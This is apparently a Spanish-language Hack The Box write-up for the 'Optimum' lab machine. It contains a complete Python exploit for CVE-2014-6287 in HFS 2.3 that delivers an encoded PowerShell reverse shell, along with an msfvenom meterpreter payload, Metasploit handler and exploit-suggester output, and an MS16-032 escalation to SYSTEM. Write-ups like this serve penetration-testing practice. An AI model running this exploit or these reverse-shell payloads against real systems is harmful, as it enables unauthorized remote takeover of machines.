---
tags:
title: Optimun - Easy (HTB)
permalink: /Optimun-HTB-Writeup
toc: true
toc_sticky: true
sidebar: main
toc_label: Topics
---
---
# Recon

```bash
nmap -sCV -p80 10.129.230.236
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 16:19 -0300
Nmap scan report for optimun.htb10.129.230.236 (10.129.230.236)
Host is up (0.46s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.96 seconds
```

## Website 

Por el puerto `80` veo que corre `HttpFileServer` con la version `2.3`.

![image-center](/assets/images/Pasted image 20260116161914.png)
## Shell as kostas

### CVE-2014-6287

Para esta versión existe una vulnerabilidad la cual me permite a mi inyectar comandos, y por ende enviarme una shell, a continuacion un script con la automatización del ataque.

```python
#!/usr/bin/python3
#
# Rejetto HFS 2.3.x RCE Vulnerability Exploit
# CVE-2014-6287
#
# Using Nikhil Mittal Powershell Reverse Shell One Liner
#
#

import requests
import urllib
import base64

lhost = '10.10.17.19' # Change this
lport = '4444'        # Change this
rhost = '10.129.230.236' # Change this
rport = '80'        # Change this

command = '$client = New-Object System.Net.Sockets.TCPClient("' + lhost + '",' + lport + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

command_bytes = command.encode('utf-16le')
base64_bytes = base64.b64encode(command_bytes)
encodedcommand = base64_bytes.decode('ascii')

payload = 'exec|powershell.exe -ep bypass -encodedcommand ' + encodedcommand 

encodedpayload = urllib.parse.quote_plus(payload)

url = 'http://' + rhost + ':' + rport + '/?search=%00{.' + encodedpayload + '.}'

r = requests.get(url)

if r.status_code == 200:
    print('GET Request Sent')
else:
    print('Failed to Send Request')
```
### Shell

Después de ejecutarlo con `python3 exploit.py` recibo la conexión como el usuario `kostas`.

```bash
 rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.230.236] 49158
whoami
optimum\kostas

PS C:\Users\kostas\Desktop> cat user.txt
ece4365d2959c3a64194af8b1ff53eda
```
### Shell as nt authority\system
### Meterpreter
Como no vi nada en el sistema, cree un payload con `msfvenom` y lo subí a la maquina.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=4444 -f exe -o rev.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```

Setee el `meterpreter` para recibir la conexión.

```bash
msfconsole -q         
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.17.19
lhost => 10.10.17.19
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444
```

Y luego de ejecutarlo recibo la conexión en el mismo.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Sending stage (230982 bytes) to 10.129.230.236
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.230.236:49172) at 2026-01-16 16:48:57 -0300

meterpreter > bg
[*] Backgrounding session 1...
```
### Change arch

Para la escalada use el modulo de `metasploit`.

```bash
msf exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run
```

Luego de correrlo obtuve los siguiente resultados.

```bash
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.230.236 - Collecting local exploits for x64/windows...
[*] 10.129.230.236 - 229 exploit checks are being tried...
[+] 10.129.230.236 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.129.230.236 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.129.230.236 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.129.230.236 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.230.236 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 50 / 50
[*] 10.129.230.236 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 8.1/Windows Server 2012 R2 build detected!
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
<SNIP>
```
### Migrate proccess

Después de probar uno a uno, el `ms16_032_secondary_logon_handle_privesc` quería darme una shell, pero por algún motivo no lo hacia, y es porque tengo q migrar a un proceso de `64` bits, y el proceso de mi shell es de `32` ya que `HFS` es un proceso que corre en `32 bits`.

Para migrar, use el comando `ps` para listar los procesos actuales y buscar uno de `64 bits`, en donde vi a `explorer.exe` (el típico de siempre), luego para migrar use la sintaxis --> `migrate <pid>`.

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User            Path
 ---   ----  ----                     ----  -------  ----            ----
 0     0     [System Process]
 4     0     System
 228   4     smss.exe
 320   484   spoolsv.exe
 336   328   csrss.exe
 392   384   csrss.exe
 400   328   wininit.exe
 428   384   winlogon.exe
 484   400   services.exe
 492   400   lsass.exe
 548   484   svchost.exe
 576   484   svchost.exe
 624   484   vmtoolsd.exe
 640   2492  powershell.exe           x86   1        OPTIMUM\kostas  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 656   484   svchost.exe
 660   428   dwm.exe
 668   1984  explorer.exe             x64   1        OPTIMUM\kostas  C:\Windows\Explorer.EXE
 <SNIP>
meterpreter > migrate 668
[*] Migrating from 1244 to 668...
[*] Migration completed successfully.
```
### Shell

Ya después volví a correr el exploit, lo que por fin me dio la shell.

```bash
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\gBFTBrtP.ps1...
[*] Compressing script contents...
[+] Compressed size: 3743
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1188

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

t6Nl2wK0I9NWMHP1Z17pbWotGTdy72JD
[+] Executed on target machine.
[*] Sending stage (188998 bytes) to 10.129.230.236
[*] Meterpreter session 2 opened (10.10.17.19:4444 -> 10.129.230.236:49173) at 2026-01-16 17:07:46 -0300
[+] Deleted C:\Users\kostas\AppData\Local\Temp\gBFTBrtP.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```powershell
meterpreter > shell
Process 2004 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\users\administrator\desktop
cd C:\users\administrator\desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
020c00153fe1a632e8afbf7d998a7000
```

`~Happy Hacking.`
